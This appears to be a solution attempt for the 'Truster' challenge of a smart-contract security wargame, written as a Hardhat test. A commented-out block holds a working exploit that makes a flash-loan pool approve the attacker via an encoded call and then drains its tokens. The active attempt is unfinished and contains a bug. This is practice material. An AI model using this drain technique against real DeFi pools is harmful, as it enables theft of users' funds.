const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    // it('Exploit', async function () {
    //     /** CODE YOUR EXPLOIT HERE  */
    //     const ABI = "function approve(address spender, uint256 amount)";
    //     const interface = new ethers.utils.Interface(ABI);
    //     const data = interface.encodeFunctionData("approve", [attacker, TOKENS_IN_POOL.toString()]);

    //     await this.pool.flashLoan(0, attacker, this.token.address, data); 
    //     await this.token.transferFrom(this.pool.address, attacker, TOKENS_IN_POOL); 
    // });
    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */
        const AttackTrusterDeployer = await ethers.getContractFactory("AttackTruster", attacker);
        const attackContract = await AttackTrusterDeployer.deploy(this.pool.address, this.token.address); 
        
        const amount = 0;
        const borrower = attacker.address;
        const target = this.token.address;

        const abi = ["function approve(address spender, uint256 amount)"]
        const iface = new ethers.utils.interface(abi);
        const data = iface.encodeFunctionData("approve", [attackContract.address,])
        
    });


    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

